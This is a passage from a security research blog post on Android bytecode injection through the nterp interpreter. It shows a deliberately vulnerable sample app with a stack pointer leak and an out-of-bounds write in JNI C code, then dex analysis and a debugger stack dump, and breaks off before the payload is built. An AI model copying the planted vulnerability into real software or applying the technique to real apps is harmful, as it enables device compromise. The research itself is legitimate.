<!doctype html><html lang=en dir=ltr><head><title>Bytecode Injection (Part 3) :: lolcads tech blog</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Bytecode Injection (Part 3) With all the basics out of the way, this blog post shows the first bytecode - based exploitation technique on Android: bytecode injection! This opens the door to many interesting exploits, where injected bytecode can function as a one - in - all solution or an intermediate stage.
In order to fully understand this technique, it is recommended to read the introductory blog posts first! As of writing, there is no public information on this topic except for the Android source code.
"><meta name=keywords content="Android,Bytecode,Exploitation"><meta name=robots content="noodp"><link rel=manifest href=/manifest.json><meta property="og:url" content="https://lolcads.github.io/posts/2024/09/bytecode_exploitation_2/"><meta property="og:site_name" content="lolcads tech blog"><meta property="og:title" content="Bytecode Injection (Part 3)"><meta property="og:description" content="Bytecode Injection (Part 3) With all the basics out of the way, this blog post shows the first bytecode - based exploitation technique on Android: bytecode injection! This opens the door to many interesting exploits, where injected bytecode can function as a one - in - all solution or an intermediate stage.
In order to fully understand this technique, it is recommended to read the introductory blog posts first! As of writing, there is no public information on this topic except for the Android source code."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-09-10T09:20:53+02:00"><meta property="article:modified_time" content="2024-09-10T09:20:53+02:00"><meta property="article:tag" content="Android"><meta property="article:tag" content="Bytecode"><meta property="article:tag" content="Exploitation"><meta name=twitter:card content="summary"><meta name=twitter:title content="Bytecode Injection (Part 3)"><meta name=twitter:description content="Bytecode Injection (Part 3) With all the basics out of the way, this blog post shows the first bytecode - based exploitation technique on Android: bytecode injection! This opens the door to many interesting exploits, where injected bytecode can function as a one - in - all solution or an intermediate stage.
In order to fully understand this technique, it is recommended to read the introductory blog posts first! As of writing, there is no public information on this topic except for the Android source code."><link rel=canonical href=https://lolcads.github.io/posts/2024/09/bytecode_exploitation_2/><link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=/css/index.min.08ae78ad799bdf6bc07f88b81fb42f6102cb7ef8c52893763bcc6ef38078b13f.css></head><body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800"><header class="flex flex-none justify-center z-10"><div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3"><div class="flex-none ml-2 md:ml-0"><a href=/><img class="h-12 w-12 rounded-full object-cover bg-gray-100" src=/logo.png alt=logo></a></div><div class=flex-1></div><div class=flex-none><nav class="h-full static"><button id=navbar-menu-toggle type=button class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls=navbar-menu aria-expanded=false>
<span class=sr-only>Open main menu</span>
<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 6h16"/><path d="M4 12h16"/><path d="M4 18h16"/></svg></i></button><div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id=navbar-menu><ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5"><li id=post><a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600" href=/posts/ title=Blog>Blog</a></li><li id=about><a class="block px-3 py-3 hover:text-emerald-600" href=/about/ title=About>About</a></li><li id=contact><a class="block px-3 py-3 hover:text-emerald-600" href=/contact/ title=Contact>Contact</a></li></ul></div></nav></div><div class="flex-none mx-1"></div><div class="flex-none md:hidden"><a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls=navbar-menu aria-expanded=false><span class=sr-only>Search</span>
<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1014 0A7 7 0 103 10"/><path d="M21 21l-6-6"/></svg></i></a></div><div class="darkmode-toggle flex flex-none mr-2 md:mr-0"><label for=darkmode-toggle class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode"><input name=darkmode-toggle id=darkmode-toggle type=checkbox class="sr-only peer" aria-label="Toggle dark mode"><div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700"><i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible"><svg class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-3 0a3 3 0 106 0 3 3 0 10-6 0"/><path d="M12 5v.01"/><path d="M17 7v.01"/><path d="M19 12v.01"/><path d="M17 17v.01"/><path d="M12 19v.01"/><path d="M7 17v.01"/><path d="M5 12v.01"/><path d="M7 7v.01"/></svg>
</i><i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible"><svg class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 3c.132.0.263.0.393.0a7.5 7.5.0 007.92 12.446A9 9 0 1112 2.992z"/><path d="M17 4a2 2 0 002 2 2 2 0 00-2 2 2 2 0 00-2-2 2 2 0 002-2"/><path d="M19 11h2m-1-1v2"/></svg></i></div></label></div></div></header><main class="flex flex-auto justify-center"><div class="w-full max-w-4xl lg:max-w-5xl"><div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700"><div><a href=/posts/2024/09/bytecode_exploitation_2/></a></div><div class="flex flex-col gap-y-3 p-6"><h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100"><a href=/posts/2024/09/bytecode_exploitation_2/>Bytecode Injection (Part 3)</a></h1><ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300"><li><a href=/tags/android/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Android</span></a></li><li><a href=/tags/bytecode/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Bytecode</span></a></li><li><a href=/tags/exploitation/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Exploitation</span></a></li></ul><div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300"><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 7a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V7z"/><path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/><path d="M11 15h1"/><path d="M12 15v3"/></svg>
</i><time datetime=2024-09-10T09:20:53+02:00>2024-09-10</time></div><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6.5 7h11"/><path d="M6 20v-2a6 6 0 1112 0v2a1 1 0 01-1 1H7a1 1 0 01-1-1z"/><path d="M6 4v2a6 6 0 1012 0V4a1 1 0 00-1-1H7A1 1 0 006 4z"/></svg>
</i><span>33 minutes to read</span></div></div><div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300"><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-user"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 7a4 4 0 108 0A4 4 0 008 7"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
</i><span>Pascal Kühnemann</span></div></div><section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6"><h2>Table of Contents</h2><aside><nav id=TableOfContents><ul><li><a href=#motivation>Motivation</a></li><li><a href=#the-problems>The Problems</a></li><li><a href=#sample-app>Sample App</a></li><li><a href=#bytecode-injection>Bytecode Injection</a><ul><li><a href=#building-a-bytecode-payload>Building a Bytecode Payload</a></li><li><a href=#the-attack>The Attack</a></li><li><a href=#context---switching>Context - Switching</a></li><li><a href=#further-applications>Further Applications</a></li><li><a href=#possible-mitigations>Possible Mitigations</a></li></ul></li><li><a href=#summary>Summary</a></li></ul></nav></aside></section><article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content"><h1 id=bytecode-injection-part-3>Bytecode Injection (Part 3)</h1><p>With all the basics out of the way, this blog post shows the first bytecode - based exploitation technique on Android: <em>bytecode injection</em>! This opens the door to many interesting exploits, where injected bytecode can function as a one - in - all solution or an intermediate stage.</p><p>In order to fully understand this technique, it is recommended to read the introductory blog posts first! As of writing, there is no public information on this topic except for the Android source code.</p><h2 id=motivation>Motivation</h2><p>When exploiting a memory error, several security mechanisms must be bypassed. These include, but are not limited to, DEP/N^X, ASLR, RELRO, Canaries, and, if you are unlucky, ShadowStack, CFI and SafeStack. Notice that these security mechanisms have not been developed all at once, but rather one by one in response to emerging exploitation techniques. For example, native code injection on the stack caused the stack to be mapped with <code>rw-</code> instead of <code>rwx</code>. Another example is ASLR being a response to return - into - libc and ROP. This is called the <em>arms race</em> in binary exploitation, where a response from the offensive security community triggers a response from the defensive security community and vice versa.</p><p>Unfortunately, native code is not the only resource that can be executed. Notice that native code is basically <em>interpreted</em> by the CPU. With that in mind, other interpreters can be investigated and analysed for whether they allow particular exploitation techniques. In case of this blog series, Android&rsquo;s interpreter <code>nterp</code> is analysed for parallels to the exploitation techniques of native code.</p><p>The general motivation for why other interpreters are interesting in the context of exploitation techniques is simple: <em>most</em> security mechanisms are interpreter - specific, i.e. specific to execution environment (architecture, OS, &mldr;). For example, DEP/N^X enforces that pages are never <code>rwx</code> (for the sake of the example, ignore JIT). Hence, native code injection is not feasible. However, changing the interpreter to <code>nterp</code> also changes the entire execution environment an attacker is working with. As we see later on, no one prevents an attacker from injecting and executing bytecode. In other words, <em>most</em> security mechanisms for one interpreter do not generalize to other interpreters.</p><h2 id=the-problems>The Problems</h2><p>Although impossible to prove with concrete references, I claim that <code>nterp</code> <strong>does not distinguish data and code</strong>. In other words, whatever the <code>dex_pc</code> is set to is interpreted. This is exactly what had happened decades ago with native code! Identical to early days of binary exploitation, given the ability to redirect control - flow through a memory error, <code>nterp</code> can be forced to execute whatever an attacker desires.</p><p>Consider the following example. In a setting where an attacker gets access to a stack pointer and the ability to repeatedly exploit a stack - buffer index out - of - bounds write, with bytecode, it is possible to construct an exploit. Even worse, directly using classical native - level techniques like ROP seems infeasible, because ROP needs leaks on executable memory regions. So, bytecode injection opens new avenues for exploitation!</p><p>While the above example works for a <em>remote</em> attacker, a <em>local</em> attacker is not even constrained by ASLR, because of Android&rsquo;s fork server architecture. A local attacker in the above example enables ROP and boosts bytecode injection, because a lot of data is identical over multiple apps.</p><h2 id=sample-app>Sample App</h2><p>For this blog post, we construct a simple, deliberately vulnerable app with</p><ul><li>a repeatable stack - buffer index out - of - bounds write primitive, and</li><li>a single stack address leak.</li></ul><p>The idea is to create a scenario where e.g. ROP is infeasible and bytecode injection is simple. Not only does this approach ease understanding nuances of bytecode - based exploitation, but it also shows that bytecode injection is not superfluous, i.e. it is a new tool in an attacker&rsquo;s tool box.</p><p>Notice that the app assumes a <em>remote</em> attacker, which is facilitated using simple socket I/O. In practice, an attacker may serve a malicious website that exploits a bug in V8 or perform a MITM attack on the communication of the target app and a backend server. Now, consider the following, relevant app snippets.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=kd>private</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>run</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=kc>true</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=n>TAG</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Initializing server....&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>this</span><span class=p>.</span><span class=na>initServer</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=n>TAG</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Setting up connection....&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>this</span><span class=p>.</span><span class=na>setupConnection</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// Send leak</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>this</span><span class=p>.</span><span class=na>writeLong</span><span class=p>(</span><span class=n>MainActivity</span><span class=p>.</span><span class=na>leakStack</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// Loop until user wants to exit</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>readBool</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=c1>// Receive index and value for stack oob</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>MainActivity</span><span class=p>.</span><span class=na>writeIndexed</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>readInt</span><span class=p>(),</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>readLong</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=kd>final</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>e</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>finally</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>this</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>stayAlive</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>break</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=n>TAG</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Restarting server socket....&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>protected</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>onCreate</span><span class=p>(</span><span class=n>Bundle</span><span class=w> </span><span class=n>savedInstanceState</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>super</span><span class=p>.</span><span class=na>onCreate</span><span class=p>(</span><span class=n>savedInstanceState</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>new</span><span class=w> </span><span class=n>Thread</span><span class=p>(</span><span class=k>this</span><span class=p>::</span><span class=n>run</span><span class=p>).</span><span class=na>start</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>native</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=nf>leakStack</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>native</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>writeIndexed</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>index</span><span class=p>,</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></div><p>Below are the vulnerable, native methods invoked in the above Java code. The memory errors, i.e. a unique stack pointer leak and a repeatable stack - buffer index out - of - bounds write, manifest at the JNI layer.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>extern</span> <span class=s>&#34;C&#34;</span>
</span></span><span class=line><span class=cl><span class=n>JNIEXPORT</span> <span class=n>jlong</span> <span class=n>JNICALL</span>
</span></span><span class=line><span class=cl><span class=nf>Java_com_poc_poc_1remote_MainActivity_leakStack</span><span class=p>(</span><span class=n>JNIEnv</span> <span class=o>*</span><span class=n>env</span><span class=p>,</span> <span class=n>jclass</span> <span class=n>clazz</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span><span class=o>&amp;</span><span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>extern</span> <span class=s>&#34;C&#34;</span>
</span></span><span class=line><span class=cl><span class=n>JNIEXPORT</span> <span class=kt>void</span> <span class=n>JNICALL</span>
</span></span><span class=line><span class=cl><span class=nf>Java_com_poc_poc_1remote_MainActivity_writeIndexed</span><span class=p>(</span><span class=n>JNIEnv</span> <span class=o>*</span><span class=n>env</span><span class=p>,</span> <span class=n>jclass</span> <span class=n>clazz</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                                   <span class=n>jint</span> <span class=n>index</span><span class=p>,</span> <span class=n>jlong</span> <span class=n>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                                                   <span class=nf>__attribute__</span> <span class=p>((</span><span class=n>optnone</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=o>*</span><span class=n>buffer</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>buffer</span><span class=p>[</span><span class=n>index</span><span class=p>]</span> <span class=o>=</span> <span class=n>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>For some reason optimizations for <code>writeIndexed</code> had to be disabled, probably because some data - flow analysis in the compiler realized that the code does not really do anything meaningful, i.e. no (direct) outputs. However, this suffices for the purpose of <em>proving</em> that bytecode injection is possible.</p><p>With the above setup, a remote attacker can connect to the vulnerable app and repeatedly write on the stack. Moreover, an attacker is able to construct data structures and references to these structures on the stack, yielding a powerful primitive especially for <em>data - oriented</em> attacks.</p><p>Building the app in <em>release</em> mode with default Android Studio settings yields an <code>.apk</code> file, which is actually a <code>.zip</code> file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ unzip app-release.apk
</span></span><span class=line><span class=cl>$ ls
</span></span><span class=line><span class=cl>AndroidManifest.xml  assets  classes.dex  DebugProbesKt.bin  kotlin  lib  META-INF  res  resources.arsc
</span></span></code></pre></div><p>There is only a single <code>classes.dex</code> file that must account for all Java code in the app. Moreover, the <code>classes.dex</code> file must contain some of the framework - related bytecode, types etc. required to launch the app. Therefore, the context of e.g. <code>MainActivity::run</code> is <code>classes.dex</code>. What is more is that <code>classes.dex</code> holds a lot more types and methods than are used to <em>program</em> the sample app. A quick <code>.dex</code> file analysis reveals that <code>classes.dex</code> indeed holds additional types and methods.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; file --file unpacked_poc_remote/classes.dex --type DEX
</span></span><span class=line><span class=cl>classes.dex&gt; list types --regex java/lang/Runtime
</span></span><span class=line><span class=cl>    <span class=o>[</span><span class=nv>Index</span> <span class=o>=</span> 0x1507<span class=o>]</span>: java/lang/Runtime
</span></span><span class=line><span class=cl>    <span class=o>[</span><span class=nv>Index</span> <span class=o>=</span> 0x1508<span class=o>]</span>: java/lang/RuntimeException
</span></span><span class=line><span class=cl>classes.dex&gt; list methods --regex <span class=s2>&#34;Runtime::getRuntime&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>[</span><span class=nv>Index</span> <span class=o>=</span> 0xa6ee<span class=o>]</span>: java/lang/Runtime java/lang/Runtime::getRuntime<span class=o>()</span>
</span></span></code></pre></div><p>Before delving into exploitation, lets see how the native methods are invoked by <code>MainActivity::run</code>. To increase readability, <code>Lcom/poc/poc_remote/MainActivity</code> is replaced with <code>LMainActivity</code>, where <code>L</code> indicates an object type, and some formatting is done.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>classes.dex&gt; list methods --regex <span class=s2>&#34;MainActivity::run&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>[</span><span class=nv>Index</span> <span class=o>=</span> 0xa51d, <span class=nv>Offset</span> <span class=o>=</span> 0x37db10, Num <span class=nv>Regs</span> <span class=o>=</span> 0x4<span class=o>]</span>:
</span></span><span class=line><span class=cl>        private void MainActivity::run<span class=o>()</span>
</span></span><span class=line><span class=cl>    <span class=o>[</span><span class=nv>Index</span> <span class=o>=</span> 0xa51d<span class=o>]</span>:
</span></span><span class=line><span class=cl>        void MainActivity::run<span class=o>()</span>
</span></span><span class=line><span class=cl>classes.dex&gt; decompile method --index 0xa51d
</span></span><span class=line><span class=cl>    <span class=o>[</span><span class=nv>Index</span> <span class=o>=</span> 0xa51d, <span class=nv>Offset</span> <span class=o>=</span> 0x37db10, Num <span class=nv>Regs</span> <span class=o>=</span> 0x4<span class=o>]</span>:
</span></span><span class=line><span class=cl>    private void MainActivity::run<span class=o>()</span>
</span></span><span class=line><span class=cl>        ...
</span></span><span class=line><span class=cl>        001e: INVOKE_DIRECT <span class=o>{</span>v3<span class=o>}</span>, METHOD:LMainActivity<span class=p>;</span>-&gt;setupConnection<span class=o>()</span>V
</span></span><span class=line><span class=cl>        0024: INVOKE_STATIC <span class=o>{}</span>, METHOD:LMainActivity<span class=p>;</span>-&gt;leakStack<span class=o>()</span>J
</span></span><span class=line><span class=cl>        002a: MOVE_RESULT_WIDE v0
</span></span><span class=line><span class=cl>        ...
</span></span><span class=line><span class=cl>        003e: INVOKE_DIRECT <span class=o>{</span>v3<span class=o>}</span>, METHOD:LMainActivity<span class=p>;</span>-&gt;readInt<span class=o>()</span>I
</span></span><span class=line><span class=cl>        0044: MOVE_RESULT v0
</span></span><span class=line><span class=cl>        0046: INVOKE_DIRECT <span class=o>{</span>v3<span class=o>}</span>, METHOD:LMainActivity<span class=p>;</span>-&gt;readLong<span class=o>()</span>J
</span></span><span class=line><span class=cl>        004c: MOVE_RESULT_WIDE v1
</span></span><span class=line><span class=cl>        004e: INVOKE_STATIC <span class=o>{</span>v0, v1, v2<span class=o>}</span>, METHOD:LMainActivity<span class=p>;</span>-&gt;writeIndexed<span class=o>(</span>I,J<span class=o>)</span>V
</span></span><span class=line><span class=cl>        0054: GOTO +-17
</span></span><span class=line><span class=cl>        ...
</span></span></code></pre></div><p>Basically, invocations of <code>MainActivity::leakStack</code> and <code>MainActivity::writeIndexed</code> use the <code>invoke-static</code> instruction. This is not surprising, because both methods are declared using the <code>static</code> keyword. Unfortunately it is unclear why <code>writeIndexed</code> is given <code>v2</code> as a third parameter. Overall, bytecode is used to execute native methods, and thus execution must eventually continue in bytecode after the native methods are done executing.</p><blockquote><p><em>Note</em>: Offsets are in terms of code units. In the above code snippet, the <code>GOTO +-17</code> actually references <code>0x54 + 2 * (-17) = 0x32</code>. In general, each instruction uses a multiple of code units bytes, which means instruction offsets and addresses are always two - byte aligned!</p></blockquote><h2 id=bytecode-injection>Bytecode Injection</h2><p>From a previous blog post, we know that the bytecode return address lies on the stack. So, the layout of <a href=https://android.googlesource.com/platform/art/+/refs/tags/android-13.0.0_r78/runtime/nterp_helpers.cc#39 target=_blank rel=noopener><code>nterp</code></a>
and <a href=https://android.googlesource.com/platform/art/+/refs/tags/android-13.0.0_r78/runtime/arch/arm64/quick_entrypoints_arm64.S#1710 target=_blank rel=noopener>JNI</a>
stack frames can be used to identify what <em>critical</em> data is in close proximity to the oob write. Below is an excerpt from a particular app execution.</p><pre tabindex=0><code>gef➤  canary
    [+] The canary of process 9862 is at 0x7ff247af28, value is 0xe009ee421ed97f00
gef➤  i r sp
    sp             0x7c0fe66620        0x7c0fe66620
gef➤  hexdump qword $sp --size 0x28
0x7c0fe66620 │+0x0000   0x0013000000000000   // &lt;-- $sp
0x7c0fe66628 │+0x0008   0x0000007c0fe66650   
0x7c0fe66630 │+0x0010   0x0013000000000000   
0x7c0fe66638 │+0x0018   0x0000020000000000   
0x7c0fe66640 │+0x0020   0x0000007f27664480   
0x7c0fe66648 │+0x0028   0xb400007d48b969f0   
0x7c0fe66650 │+0x0030   0x0000000000000000   
0x7c0fe66658 │+0x0038   0x66f0649020037d8d   // Stack canary
0x7c0fe66660 │+0x0040   0x0000007c0fe66758   // Old base pointer (x29)
0x7c0fe66668 │+0x0048   0x0000007c14c741ac   // Return address (x30)
0x7c0fe66670 │+0x0050   0x0000007f27664480   // ArtMethod* &lt;---- END OF JNI FRAME
0x7c0fe66678 │+0x0058   0x0000007c0fe66748   // Padding? (Vrefs of calling method)
0x7c0fe66680 │+0x0060   0x0000000000000000   // Padding
0x7c0fe66688 │+0x0068   0x0000000000000000   // Padding? Expected d0-d7
0x7c0fe66690 │+0x0070   0x0000000000000000   // x1
0x7c0fe66698 │+0x0078   0x0000000000000000   // x2
0x7c0fe666a0 │+0x0080   0x0000000000000000   // x3
0x7c0fe666a8 │+0x0088   0x0000000000000000   // x4
0x7c0fe666b0 │+0x0090   0x0000000000000000   // x5
0x7c0fe666b8 │+0x0098   0x0000000000000000   // x6
0x7c0fe666c0 │+0x00a0   0xb400007df8b82a10   // x7
0x7c0fe666c8 │+0x00a8   0x0000000000000000   // Marking Register (MR, x20)
0x7c0fe666d0 │+0x00b0   0xb400007df8b82ad0   // Suspend (x21)
0x7c0fe666d8 │+0x00b8   0x0000007c147a64be   // dex_pc_ptr (PC, x22)
